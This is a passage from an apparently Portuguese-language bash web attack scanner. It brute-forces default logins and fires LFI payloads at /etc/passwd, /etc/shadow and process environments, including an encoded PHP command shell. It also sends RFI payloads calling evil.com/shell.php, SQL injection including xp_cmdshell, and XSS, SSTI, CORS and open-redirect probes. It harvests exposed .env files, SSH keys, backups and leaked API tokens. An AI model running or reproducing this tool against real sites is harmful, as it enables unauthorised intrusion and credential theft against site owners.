  subinfo "Testando credenciais padrão em $URL..."
  for user in admin root sa postgres elastic kibana grafana guest user test; do
    for pass in "" admin password 123456 "$user" "${user}123" root toor changeme letmein default; do
      RESP=$(curl -sk --max-time 4 \
        -d "username=$user&password=$pass" \
        -d "pma_username=$user&pma_password=$pass" \
        -c /tmp/gc_cookies.txt -b /tmp/gc_cookies.txt \
        -o /tmp/gc_body.html -w "%{http_code}" "$URL" 2>/dev/null)
      if [ "$RESP" = "302" ] || [ "$RESP" = "200" ]; then
        grep -qi "logout\|sign out\|dashboard\|tables\|databases\|welcome\|overview" /tmp/gc_body.html 2>/dev/null && {
          critical "LOGIN PADRÃO OK: $user:$pass em $URL"
          url_found "$URL (user=$user pass=$pass)"
          return
        }
      fi
    done
  done
}

# ================================================================
#  [10] ARQUIVO VULNERÁVEL SCANNER (LFI/RFI/BACKUP/CONFIG/LOG)
# ================================================================

file_vuln_scanner() {
  section "📁 [10] ARQUIVO VULNERÁVEL SCANNER"

  # ── LFI (Local File Inclusion) ───────────────────────────────
  info "Testando LFI (Local File Inclusion)..."

  LFI_PAYLOADS=(
    "../../../../../../etc/passwd"
    "../../../../../../etc/shadow"
    "../../../../../../etc/hosts"
    "../../../../../../windows/system32/drivers/etc/hosts"
    "../../../../../../windows/win.ini"
    "../../../../../../proc/self/environ"
    "../../../../../../proc/self/cmdline"
    "../../../../../../var/log/apache2/access.log"
    "../../../../../../var/log/nginx/access.log"
    "../../../../../../var/log/auth.log"
    "../../../../../../etc/mysql/my.cnf"
    "../../../../../../etc/php.ini"
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    "....//....//....//etc//passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
    "php://filter/read=convert.base64-encode/resource=index.php"
    "expect://id"
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
    "/etc/passwd%00"
    "../../etc/passwd%00"
  )

  LFI_PARAMS=(file page path include template doc document load read src source view lang language module)

  for param in "${LFI_PARAMS[@]}"; do
    for payload in "${LFI_PAYLOADS[@]}"; do
      URL_LFI="$FULL_URL/?$param=$payload"
      RESP=$(curl -sk --max-time 6 "$URL_LFI" 2>/dev/null)
      if echo "$RESP" | grep -qiE "root:.*:0:|bin:/bin|windows\[extensions\]|\\[boot loader\\]|\[global\]|PHP Version|directive"; then
        critical "LFI CONFIRMADO! Parâmetro: $param"
        url_found "$URL_LFI"
        echo "$RESP" | grep -E "root:|bin:|daemon:" | head -5 | while read l; do found "LFI Data: $l"; done
        break 2
      fi
    done
  done

  # ── RFI (Remote File Inclusion) ──────────────────────────────
  info "Testando RFI (Remote File Inclusion)..."
  RFI_PAYLOADS=(
    "http://evil.com/shell.php"
    "https://evil.com/shell.php"
    "http://evil.com/shell.txt"
    "ftp://evil.com/shell.php"
    "\\\\evil.com\\shell.php"
  )
  for param in "${LFI_PARAMS[@]}"; do
    for rfi in "${RFI_PAYLOADS[@]}"; do
      RESP=$(curl -sk --max-time 5 "$FULL_URL/?$param=$rfi" -o /dev/null -w "%{http_code}" 2>/dev/null)
      if [ "$RESP" = "500" ]; then
        warn "Possível RFI em ?$param= (HTTP 500 com URL externa)"
        url_found "$FULL_URL/?$param=$rfi (possível RFI)"
      fi
    done
  done

  # ── BACKUP FILES ─────────────────────────────────────────────
  info "Procurando arquivos de backup expostos..."
  BACKUP_FILES=(
    backup.zip backup.tar.gz backup.tar backup.sql backup.db
    backup/ backups/ bkp/ bak/
    site.zip site.tar.gz "${DOMAIN}.zip" "${DOMAIN}.tar.gz"
    www.zip www.tar.gz html.zip html.tar.gz
    database.sql db.sql dump.sql backup.sql data.sql
    mysql.sql mysqldump.sql schema.sql
    db_backup.sql site_backup.zip
    old.zip old.tar.gz old/
    ".git/config" ".git/HEAD" ".git/COMMIT_EDITMSG"
    ".svn/entries" ".svn/wc.db"
    ".hg/hgrc"
    ".bzr/branch/format"
  )

  for f in "${BACKUP_FILES[@]}"; do
    URL_BKP="$FULL_URL/$f"
    CODE=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "$URL_BKP" 2>/dev/null)
    SIZE=$(curl -sk --max-time 6 -o /dev/null -w "%{size_download}" "$URL_BKP" 2>/dev/null)
    if [[ "$CODE" == "200" ]] && [[ "$SIZE" -gt 100 ]]; then
      critical "BACKUP EXPOSTO ($CODE, ${SIZE}bytes): $URL_BKP"
      url_found "$URL_BKP"
    fi
  done

  # ── CONFIG FILES ─────────────────────────────────────────────
  info "Procurando arquivos de configuração expostos..."
  CONFIG_FILES=(
    ".env" ".env.local" ".env.production" ".env.development" ".env.backup"
    ".env.example" "env.php" "config.php" "configuration.php"
    "wp-config.php" "wp-config.php.bak" "wp-config.php~" "wp-config.php.old"
    "config.php.bak" "config.php~" "settings.php" "settings.py"
    "database.php" "db.php" "connection.php" "connect.php"
    "config.yml" "config.yaml" "config.json" "config.xml"
    "application.properties" "application.yml" "application.yaml"
    "appsettings.json" "web.config"
    ".htaccess" ".htpasswd"
    "phpinfo.php" "info.php" "test.php" "debug.php" "php.php"
    "adminer.php" "db.php" "sql.php"
    "docker-compose.yml" "docker-compose.yaml" "Dockerfile"
    ".dockerenv" "docker.env"
    "composer.json" "composer.lock" "package.json" "package-lock.json"
    "Gemfile" "Gemfile.lock" "requirements.txt" "Pipfile"
    ".bash_history" ".bashrc" ".profile" ".ssh/id_rsa" ".ssh/authorized_keys"
    "id_rsa" "id_rsa.pub" "*.pem" "*.key" "private.key"
    "server.key" "server.crt" "ssl.key"
    "crossdomain.xml" "clientaccesspolicy.xml"
    "sitemap.xml" "robots.txt"
    "CHANGELOG.md" "README.md" "INSTALL.md"
    "Thumbs.db" ".DS_Store"
    "error.log" "error_log" "access.log" "debug.log"
    "phpMyAdmin/config.inc.php"
    "includes/config.php" "include/config.php" "inc/config.php"
    "app/config/parameters.yml" "app/config/config.yml"
    "config/database.yml" "config/secrets.yml"
    "src/config.php" "lib/config.php"
    ".gitignore" ".npmrc" ".pypirc" ".netrc"
  )

  for f in "${CONFIG_FILES[@]}"; do
    URL_CFG="$FULL_URL/$f"
    CODE=$(curl -sk --max-time 6 -o /tmp/gc_cfg.tmp -w "%{http_code}" "$URL_CFG" 2>/dev/null)
    if [ "$CODE" = "200" ]; then
      SIZE=$(wc -c < /tmp/gc_cfg.tmp 2>/dev/null)
      CONTENT=$(cat /tmp/gc_cfg.tmp 2>/dev/null | head -c 300)
      if echo "$CONTENT" | grep -qiE "password|passwd|secret|key|token|database|username|host|user|pass|api|connect|auth|credential"; then
        critical "ARQUIVO SENSÍVEL EXPOSTO ($SIZE bytes): $URL_CFG"
        url_found "$URL_CFG"
        echo "$CONTENT" | grep -iE "password|passwd|secret|key|token|database" | head -5 | while read l; do
          found "Dado sensível: $l"
        done
      elif [ "$SIZE" -gt 50 ]; then
        warn "Arquivo encontrado ($CODE, ${SIZE}b): $URL_CFG"
        url_found "$URL_CFG"
      fi
    fi
  done

  # ── LOG FILES ────────────────────────────────────────────────
  info "Procurando arquivos de log expostos..."
  LOG_FILES=(
    "error.log" "error_log" "access.log" "access_log"
    "debug.log" "app.log" "application.log" "server.log"
    "logs/error.log" "logs/access.log" "logs/debug.log"
    "log/error.log" "log/app.log"
    "var/log/error.log" "storage/logs/laravel.log"
    "app/storage/logs/laravel.log"
    "wp-content/debug.log" "wp-content/uploads/debug.log"
    "tmp/log" "temp/log"
    "nohup.out" "install.log" "setup.log"
  )

  for f in "${LOG_FILES[@]}"; do
    URL_LOG="$FULL_URL/$f"
    CODE=$(curl -sk --max-time 5 -o /tmp/gc_log.tmp -w "%{http_code}" "$URL_LOG" 2>/dev/null)
    if [ "$CODE" = "200" ]; then
      SIZE=$(wc -c < /tmp/gc_log.tmp 2>/dev/null)
      if [ "$SIZE" -gt 100 ]; then
        critical "LOG EXPOSTO ($SIZE bytes): $URL_LOG"
        url_found "$URL_LOG"
        cat /tmp/gc_log.tmp 2>/dev/null | grep -iE "error|exception|stack|password|token|key|secret" | head -5 | while read l; do
          found "Log data: $l"
        done
      fi
    fi
  done

  # ── GIT EXPOSED ──────────────────────────────────────────────
  info "Verificando .git exposto..."
  GIT_CHECK=$(curl -sk --max-time 5 "$FULL_URL/.git/config" 2>/dev/null)
  if echo "$GIT_CHECK" | grep -qi "\[core\]\|\[remote\]"; then
    critical ".git EXPOSTO! Código fonte acessível!"
    url_found "$FULL_URL/.git/config"
    url_found "$FULL_URL/.git/HEAD"
    url_found "$FULL_URL/.git/COMMIT_EDITMSG"
    url_found "$FULL_URL/.git/logs/HEAD"
    # Extrair remote URL
    REMOTE=$(echo "$GIT_CHECK" | grep "url = " | head -1)
    [ -n "$REMOTE" ] && found "Git remote: $REMOTE"
  fi

  # ── SVN EXPOSED ──────────────────────────────────────────────
  SVN_CHECK=$(curl -sk --max-time 5 "$FULL_URL/.svn/entries" 2>/dev/null | head -5)
  [ -n "$SVN_CHECK" ] && critical ".svn EXPOSTO!" && url_found "$FULL_URL/.svn/entries"

  # ── DS_STORE ─────────────────────────────────────────────────
  DS=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$FULL_URL/.DS_Store" 2>/dev/null)
  [ "$DS" = "200" ] && found ".DS_Store exposto (lista arquivos do servidor)" && url_found "$FULL_URL/.DS_Store"

  # ── PHPINFO ──────────────────────────────────────────────────
  for phpinfo in phpinfo.php info.php test.php php.php php_info.php; do
    CODE=$(curl -sk --max-time 5 -o /tmp/gc_phpinfo.tmp -w "%{http_code}" "$FULL_URL/$phpinfo" 2>/dev/null)
    if [ "$CODE" = "200" ]; then
      grep -qi "phpinfo\|PHP Version\|php.ini" /tmp/gc_phpinfo.tmp 2>/dev/null && {
        critical "phpinfo() EXPOSTO: $FULL_URL/$phpinfo"
        url_found "$FULL_URL/$phpinfo"
        VER=$(grep -o "PHP Version.*</td>" /tmp/gc_phpinfo.tmp 2>/dev/null | head -1 | sed 's/<[^>]*>//g')
        [ -n "$VER" ] && found "PHP Version: $VER"
      }
    fi
  done
}

# ================================================================
#  [11] DIRECTORY BRUTE FORCE
# ================================================================

dir_brute() {
  section "📂 [11] DIRECTORY BRUTE FORCE"
  info "Procurando diretórios e arquivos sensíveis..."

  DIRS=(
    admin administrator admin/ administrator/ wp-admin/ login/ dashboard/
    panel control cpanel whm plesk webmin
    api api/ api/v1 api/v2 rest graphql
    uploads upload files file media img images
    backup backups bkp bak old archive
    tmp temp cache data storage assets
    .well-known well-known
    server-status server-info nginx_status php_status
    phpMyAdmin phpmyadmin pma adminer
    wp-content/uploads wp-content/plugins wp-includes
    static src includes lib vendor modules plugins
    install setup installer configuration config
    test tests dev staging debug
    console shell terminal exec cmd
    sitemap.xml robots.txt crossdomain.xml security.txt
    .htaccess .htpasswd .env .git .svn
    readme.html readme.txt license.txt
    swagger swagger-ui swagger.json openapi.json api-docs
    actuator actuator/env actuator/health metrics prometheus
    jolokia manager/html jmx-console web-console
    cgi-bin cgi bin scripts perl
    _vti_bin _vti_cnf FrontPage _fpclass
    webdav dav WebDAV
    solr jenkins nexus jira confluence
    phusion_passenger Passenger
    elmah.axd trace.axd web.config.bak
    WEB-INF/ META-INF/ classes/ web.xml
  )

  for dir in "${DIRS[@]}"; do
    URL_DIR="$FULL_URL/$dir"
    CODE=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$URL_DIR" 2>/dev/null)
    case "$CODE" in
      200) critical "Acessível ($CODE): $URL_DIR"; url_found "$URL_DIR";;
      301|302) warn "Redirect ($CODE): $URL_DIR"; url_found "$URL_DIR";;
      401|403) info "Restrito ($CODE): $URL_DIR — Existe mas requer auth";;
    esac
  done
}

# ================================================================
#  [12] SQL INJECTION SCANNER
# ================================================================

sqli_scanner() {
  section "💉 [12] SQL INJECTION SCANNER"

  SQLI_PAYLOADS=(
    "'"
    "''"
    "' OR '1'='1"
    "' OR 1=1--"
    "\" OR 1=1--"
    "') OR ('1'='1"
    "1' AND 1=2--"
    "1 AND 1=2"
    "' OR 'x'='x"
    "' UNION SELECT NULL--"
    "' UNION SELECT NULL,NULL--"
    "' UNION SELECT NULL,NULL,NULL--"
    "1; SELECT SLEEP(5)--"
    "1 AND SLEEP(5)"
    "1' AND SLEEP(5)--"
    "1; WAITFOR DELAY '0:0:5'--"
    "' OR 1=1#"
    "admin'--"
    "admin' #"
    "' ORDER BY 1--"
    "' ORDER BY 100--"
    "1' GROUP BY 1,2--"
    "'; EXEC xp_cmdshell('dir')--"
    "' AND EXTRACTVALUE(0,CONCAT(0x7e,VERSION()))--"
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
  )

  SQLI_ERRORS=(
    "sql syntax" "mysql_fetch" "You have an error in your SQL"
    "ORA-01756" "PostgreSQL.*ERROR" "Warning.*pg_"
    "SQLSTATE" "Unclosed quotation mark" "Microsoft OLE DB"
    "ODBC SQL Server" "SQLServer JDBC" "mysql_num_rows"
    "supplied argument is not a valid MySQL" "Division by zero"
    "stack trace:" "DB Error" "database error" "Warning.*mysql_"
    "syntax error.*near\|syntax error at" "unterminated quoted string"
    "pg_query\|pg_exec" "Warning.*oci_" "ORA-[0-9]{5}"
    "Microsoft.*Database.*Error\|ADODB\|JET Database"
    "SQLite.*error\|sqlite3\." "SQLITE_ERROR"
    "DB2.*SQL.*error\|SQLCODE" "Sybase.*Server message"
    "Informix.*SQL.*Error" "ingres.*syntax error"
  )

  PARAMS=(id page cat category p q search s item product article user uid lang type action module key ref name value data input filter sort order by limit offset start page_id post_id user_id article_id product_id)

  info "Testando ${#SQLI_PAYLOADS[@]} payloads em ${#PARAMS[@]} parâmetros..."

  for param in "${PARAMS[@]}"; do
    for payload in "${SQLI_PAYLOADS[@]}"; do
      ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
      TURL="$FULL_URL/?$param=$ENC"
      T1=$(date +%s%N 2>/dev/null || echo 0)
      RESP=$(curl -sk --max-time 8 "$TURL" 2>/dev/null)
      T2=$(date +%s%N 2>/dev/null || echo 0)
      ELAPSED=$(( (T2 - T1) / 1000000 ))

      for err in "${SQLI_ERRORS[@]}"; do
        if echo "$RESP" | grep -qiE "$err"; then
          critical "SQLi DETECTADO (Error-Based)! Param: ?$param= | Payload: $payload"
          url_found "$TURL"
          echo "$RESP" | grep -iE "$err" | head -2 | while read l; do found "SQL Error: $l"; done
          break 2
        fi
      done

      # Time-based blind SQLi detection (>=5s)
      if [ "$ELAPSED" -ge 4500 ]; then
        critical "SQLi TIME-BASED BLIND! Param: ?$param= | Payload: $payload (${ELAPSED}ms)"
        url_found "$TURL"
        break 2
      fi
    done
  done
}

# ================================================================
#  [13] XSS SCANNER
# ================================================================

xss_scanner() {
  section "⚡ [13] XSS SCANNER"

  XSS_PAYLOADS=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "<svg onload=alert(1)>"
    "\"'><script>alert(1)</script>"
    "<body onload=alert(1)>"
    "javascript:alert(1)"
    "';alert(1)//'"
    "\"><img src=x onerror=alert(1)>"
    "<iframe src=javascript:alert(1)>"
    "<input autofocus onfocus=alert(1)>"
    "<marquee onstart=alert(1)>"
    "<details open ontoggle=alert(1)>"
    "<video><source onerror=alert(1)>"
    "{{7*7}}"
    "${7*7}"
    "#{7*7}"
    "<script>document.write(7*7)</script>"
  )

  XSS_PARAMS=(q search s input name value message comment title text body content query id page)

  info "Testando ${#XSS_PAYLOADS[@]} payloads XSS em ${#XSS_PARAMS[@]} parâmetros..."

  for param in "${XSS_PARAMS[@]}"; do
    for payload in "${XSS_PAYLOADS[@]}"; do
      ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
      TURL="$FULL_URL/?$param=$ENC"
      RESP=$(curl -sk --max-time 6 "$TURL" 2>/dev/null)

      # Verificar se payload refletiu sem encode
      if echo "$RESP" | grep -qF "$payload"; then
        critical "XSS REFLETIDO! Param: ?$param= | Payload: $payload"
        url_found "$TURL"
        break 2
      fi

      # Verificar template injection
      if echo "$payload" | grep -q "7\*7" && echo "$RESP" | grep -q "49"; then
        critical "TEMPLATE INJECTION (SSTI)! Param: ?$param= | Payload: $payload"
        url_found "$TURL"
        break 2
      fi
    done
  done
}

# ================================================================
#  [14] CORS MISCONFIGURATION
# ================================================================

cors_check() {
  section "🔀 [14] CORS MISCONFIGURATION"

  RESP=$(curl -sI --max-time 8 -H "Origin: https://evil.com" "$FULL_URL" 2>/dev/null)
  ACAO=$(echo "$RESP" | grep -i "Access-Control-Allow-Origin" | head -1)

  if echo "$ACAO" | grep -qi "evil.com\|\*"; then
    critical "CORS MISCONFIGURATION! Origin refletido: $ACAO"
    url_found "$FULL_URL (CORS: $ACAO)"
  fi

  RESP2=$(curl -sI --max-time 8 -H "Origin: null" "$FULL_URL" 2>/dev/null)
  echo "$RESP2" | grep -qi "Access-Control-Allow-Origin: null" && critical "CORS permite Origin: null!"

  CREDS=$(echo "$RESP" | grep -i "Access-Control-Allow-Credentials")
  echo "$ACAO" | grep -qi "evil.com" && echo "$CREDS" | grep -qi "true" && critical "CORS + Credentials=true: CRÍTICO! Permite CSRF avançado!"
}

# ================================================================
#  [15] OPEN REDIRECT SCANNER
# ================================================================

open_redirect() {
  section "↗  [15] OPEN REDIRECT SCANNER"

  REDIR_PARAMS=(url redirect return return_url next go to dest destination location href link callback continue forward out target redir)
  REDIR_PAYLOADS=(
    "https://evil.com"
    "//evil.com"
    "///evil.com"
    "https:evil.com"
    "https://evil.com%2F@$DOMAIN"
    "https://$DOMAIN@evil.com"
    "/\\evil.com"
    "https://evil%2Ecom"
  )

  for param in "${REDIR_PARAMS[@]}"; do
    for payload in "${REDIR_PAYLOADS[@]}"; do
      ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
      TURL="$FULL_URL/?$param=$ENC"
      CODE=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$TURL" 2>/dev/null)
      LOC=$(curl -sk --max-time 5 -D - -o /dev/null "$TURL" 2>/dev/null | grep -i "^Location:" | head -1)
      if ([ "$CODE" = "301" ] || [ "$CODE" = "302" ] || [ "$CODE" = "307" ]) && echo "$LOC" | grep -qi "evil.com"; then
        critical "OPEN REDIRECT! Param: ?$param= | $TURL"
        url_found "$TURL"
        break 2
      fi
    done
  done
}

# ================================================================
#  [16] CMS VULNERABILITY SCAN
# ================================================================

cms_vuln_scan() {
  section "📦 [16] CMS VULNERABILITY SCAN"

  PAGE=$(curl -sk --max-time 10 "$FULL_URL" 2>/dev/null)

  # WordPress
  if echo "$PAGE" | grep -qi "wp-content\|wp-includes\|wordpress"; then
    info "WordPress detectado!"
    WP_VER=$(curl -sk "$FULL_URL/readme.html" 2>/dev/null | grep -i "Version\|<br />" | head -5)
    [ -n "$WP_VER" ] && found "WP readme.html exposto: $WP_VER" && url_found "$FULL_URL/readme.html"

    for f in "wp-config.php.bak" "wp-config.php~" "wp-config.php.old" "wp-config.php.save"; do
      C=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$FULL_URL/$f" 2>/dev/null)
      [ "$C" = "200" ] && critical "wp-config backup EXPOSTO: $FULL_URL/$f" && url_found "$FULL_URL/$f"
    done

    url_found "$FULL_URL/wp-json/wp/v2/users"
    url_found "$FULL_URL/?author=1"
    url_found "$FULL_URL/wp-login.php"
    url_found "$FULL_URL/xmlrpc.php"

    USERS=$(curl -sk --max-time 5 "$FULL_URL/wp-json/wp/v2/users" 2>/dev/null)
    echo "$USERS" | grep -qi '"slug"\|"name"' && found "WordPress users API exposta!" && echo "$USERS" | python3 -c "import sys,json; [print(u.get('name',''),u.get('slug','')) for u in json.load(sys.stdin) if isinstance(sys.stdin,list) or True]" 2>/dev/null | head -5 | while read l; do subinfo "WP User: $l"; done

    XMLRPC=$(curl -sk --max-time 5 "$FULL_URL/xmlrpc.php" 2>/dev/null)
    echo "$XMLRPC" | grep -qi "XML-RPC server\|xmlrpc" && found "xmlrpc.php ativo! (bruteforce possível)"

    # WordPress plugin scan
    for plugin in contact-form-7 yoast-seo woocommerce elementor revolution-slider cherry-plugin wp-file-manager wptouch; do
      C=$(curl -sk --max-time 4 -o /dev/null -w "%{http_code}" "$FULL_URL/wp-content/plugins/$plugin/readme.txt" 2>/dev/null)
      [ "$C" = "200" ] && warn "Plugin: $plugin instalado" && url_found "$FULL_URL/wp-content/plugins/$plugin/"
    done
  fi

  # Joomla
  if echo "$PAGE" | grep -qi "joomla\|/components/com_"; then
    info "Joomla detectado!"
    url_found "$FULL_URL/administrator"
    url_found "$FULL_URL/administrator/index.php"
    C=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$FULL_URL/configuration.php.bak" 2>/dev/null)
    [ "$C" = "200" ] && critical "Joomla config backup exposto!" && url_found "$FULL_URL/configuration.php.bak"
  fi

  # Drupal
  if echo "$PAGE" | grep -qi "drupal\|Drupal.settings"; then
    info "Drupal detectado!"
    url_found "$FULL_URL/user/login"
    url_found "$FULL_URL/admin/config"
    C=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$FULL_URL/sites/default/settings.php" 2>/dev/null)
    [ "$C" = "200" ] && critical "Drupal settings.php acessível!" && url_found "$FULL_URL/sites/default/settings.php"
  fi
}

# ================================================================
#  [17] API KEYS / SECRETS LEAKED EM JS
# ================================================================

api_key_leak() {
  section "🔑 [17] API KEYS / SECRETS LEAKED"

  info "Extraindo arquivos JS do site..."
  JS_FILES=$(curl -sk --max-time 10 "$FULL_URL" 2>/dev/null | grep -oE 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//' | head -20)

  declare -A API_PATTERNS=(
    ["AIza[0-9A-Za-z_-]{35}"]="Google API Key"
    ["AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}"]="Firebase/FCM Key"
    ["ya29\.[0-9A-Za-z_-]+"]="Google OAuth Token"
    ["sk_live_[0-9a-zA-Z]{24,}"]="Stripe Live Secret Key"
    ["pk_live_[0-9a-zA-Z]{24,}"]="Stripe Live Public Key"
    ["sk_test_[0-9a-zA-Z]{24,}"]="Stripe Test Key"
    ["EAABsbCS.*EAAI"]="Facebook App Token"
    ["[0-9]{15,16}\|[A-Za-z0-9]{30,50}"]="Facebook Token"
    ["xox[baprs]-[0-9a-zA-Z]{10,48}"]="Slack Token"
    ["T[A-Z0-9]{8}\/B[A-Z0-9]{8}\/[a-zA-Z0-9]{24}"]="Slack Webhook"
    ["(?:r|s)k_live_[0-9a-zA-Z]{24}"]="Stripe Key"
    ["AKID[A-Z0-9]{16}|AKIA[0-9A-Z]{16}"]="AWS Access Key"
    ["aws_secret_access_key.*=.*[A-Za-z0-9/+]{40}"]="AWS Secret Key"
    ["ghp_[0-9a-zA-Z]{36}|gho_[0-9a-zA-Z]{36}"]="GitHub Token"
    ["glpat-[0-9a-zA-Z_-]{20}"]="GitLab Token"
    ["[Aa][Pp][Ii]_?[Kk][Ee][Yy].*['\"][0-9a-zA-Z_-]{16,}['\"]"]="Generic API Key"
    ["[Ss][Ee][Cc][Rr][Ee][Tt].*['\"][0-9a-zA-Z_-]{16,}['\"]"]="Generic Secret"
    ["[Pp][Aa][Ss][Ss][Ww][Oo][Rr][Dd].*['\"][^'\"]{8,}['\"]"]="Hardcoded Password"
    ["jdbc:[a-z]+://[a-zA-Z0-9./_:-]+"]="JDBC Connection String"
    ["mongodb(\+srv)?://[^\"' ]+"]="MongoDB Connection String"
    ["redis://[^\"' ]+"]="Redis Connection String"
    ["postgres(ql)?://[^\"' ]+"]="PostgreSQL Connection String"
    ["mysql://[^\"' ]+"]="MySQL Connection String"
    ["private_key.*-----BEGIN"]="Private Key"
    ["bearer [a-zA-Z0-9._-]{20,}"]="Bearer Token"
    ["Authorization.*['\"][Bb]earer [a-zA-Z0-9._-]+"]="Auth Bearer Token"
    ["-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY"]="Private Key Material"
    ["npm_[a-zA-Z0-9]{36}"]="NPM Token"
    ["SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}"]="SendGrid API Key"
    ["key-[0-9a-zA-Z]{32}"]="Mailgun API Key"
    ["[0-9a-f]{32}-us[0-9]+"]="Mailchimp API Key"
    ["AP[0-9a-zA-Z]{30,}"]="Twilio Account SID"
    ["SK[0-9a-zA-Z]{30,}"]="Twilio Auth Token"
    ["sq0csp-[0-9A-Za-z_-]{43}"]="Square Access Token"
    ["access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}"]="PayPal Token"
    ["[Aa][Mm][Zz][Nn]_[Ss][Ss][Oo]_[Aa][Ww][Ss]_[Ss][Ee][Cc][Rr][Ee][Tt]_[Aa][Cc][Cc][Ee][Ss][Ss]_[Kk][Ee][Yy]"]="Amazon SSO Key"
    ["eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"]="JWT Token"
  )

  scan_for_keys() {
    CONTENT="$1"
    SOURCE="$2"
    for pattern in "${!API_PATTERNS[@]}"; do
      MATCH=$(echo "$CONTENT" | grep -oiE "$pattern" | head -3)
      if [ -n "$MATCH" ]; then
        critical "${API_PATTERNS[$pattern]} ENCONTRADO em $SOURCE"
        echo "$MATCH" | while read m; do found "  Key/Secret: $m"; done
        url_found "$SOURCE (leaked: ${API_PATTERNS[$pattern]})"
      fi
    done
  }

  # Scan na página principal
  scan_for_keys "$PAGE" "$FULL_URL"

  # Scan em arquivos JS
  echo "$JS_FILES" | while read jsfile; do
    [ -z "$jsfile" ] && continue
    JS_URL="$FULL_URL$jsfile"
    [[ "$jsfile" == http* ]] && JS_URL="$jsfile"
    JS_CONTENT=$(curl -sk --max-time 8 "$JS_URL" 2>/dev/null)
    [ -n "$JS_CONTENT" ] && scan_for_keys "$JS_CONTENT" "$JS_URL"
  done

  # Verificar arquivos comuns com secrets
  for f in ".env" "config.js" "settings.js" "app.js" "main.js" "bundle.js" "config.json" "secrets.json" "credentials.json"; do
    CONTENT=$(curl -sk --max-time 5 "$FULL_URL/$f" 2>/dev/null)
    [ -n "$CONTENT" ] && scan_for_keys "$CONTENT" "$FULL_URL/$f"
  done
}

# ================================================================
#  [18] SUBDOMÍNIOS
# ================================================================

subdomains_scan() {
  section "🌿 [18] SUBDOMÍNIOS"

  info "Brute force de subdomínios..."
  WORDLIST="www mail ftp smtp pop imap webmail cpanel whm api api2 dev dev2 stage staging test beta alpha preview cdn cdn2 static assets img images media files upload uploads app apps mobile m wap admin portal vpn remote intranet extranet ns1 ns2 ns3 ns4 mx mx1 mx2 smtp2 relay secure private internal dashboard status health monitor git svn jenkins ci cd jira confluence wiki docs support help billing payment shop store old new 2 3 backup bkp uat qa prod production"

  for sub in $WORDLIST; do
    IP_S=$(dig +short "$sub.$DOMAIN" A 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    if [ -n "$IP_S" ]; then
      [ "$IP_S" != "$MAIN_IP" ] && found "Subdomínio (IP diferente): $sub.$DOMAIN → $IP_S" || info "Subdomínio: $sub.$DOMAIN → $IP_S"
      url_found "https://$sub.$DOMAIN"
    fi
  done

  info "crt.sh (certificados SSL históricos)..."
  curl -s --max-time 15 "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
    python3 -c "
import sys,json
try:
  d=json.load(sys.stdin)
  s=set()
  for e in d:
    for n in e.get('name_value','').split('\n'):
      n=n.strip().replace('*.','')
      if '$DOMAIN' in n and n not in s:
        s.add(n); print(n)
except: pass
" 2>/dev/null | sort | while read sub; do
    IP_S=$(dig +short "$sub" A 2>/dev/null | head -1)
    [ -n "$IP_S" ] && subinfo "crt.sh: $sub → $IP_S"
  done

  info "HackerTarget hostsearch..."
  curl -s --max-time 10 "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" 2>/dev/null | \
    grep -v "error\|limit\|API" | head -20 | while read l; do subinfo "$l"; done
}

# ================================================================
#  [19] REVERSE IP
# ================================================================

reverse_ip() {
  section "🔄 [19] REVERSE IP"
  [ -z "$MAIN_IP" ] && return
  info "Sites no mesmo IP ($MAIN_IP)..."
  REVERSE=$(curl -s --max-time 10 "https://api.hackertarget.com/reverseiplookup/?q=$MAIN_IP" 2>/dev/null)
  echo "$REVERSE" | grep -v "error\|limit\|API" | head -30 | while read d; do [ -n "$d" ] && subinfo "$d"; done
  info "PTR (Reverse DNS)..."
  host "$MAIN_IP" 2>/dev/null | while read l; do subinfo "$l"; done
}

# ================================================================
#  [20] EMAIL OSINT
# ================================================================

email_osint() {
  section "📧 [20] EMAIL OSINT"
  info "SPF:"
  dig +short "$DOMAIN" TXT 2>/dev/null | grep -i "spf\|v=spf" | while read r; do subinfo "$r"; done
  info "DMARC:"
  dig +short "_dmarc.$DOMAIN" TXT 2>/dev/null | while read r; do subinfo "$r"; done
  info "DKIM selectors comuns..."
  for sel in default google selector1 selector2 k1 k2 mail dkim smtp s1 s2 key1 key2 2024 2025; do
    DKIM=$(dig +short "${sel}._domainkey.$DOMAIN" TXT 2>/dev/null)
    [ -n "$DKIM" ] && found "DKIM selector '$sel' encontrado!" && subinfo "$DKIM"
  done
}

# ================================================================
#  [21] TRACEROUTE COM GEO
# ================================================================

traceroute_geo() {
  section "📍 [21] TRACEROUTE GEO"
  info "Traçando rota (12 hops)..."
  traceroute -m 12 -w 2 "$MAIN_IP" 2>/dev/null | while read line; do
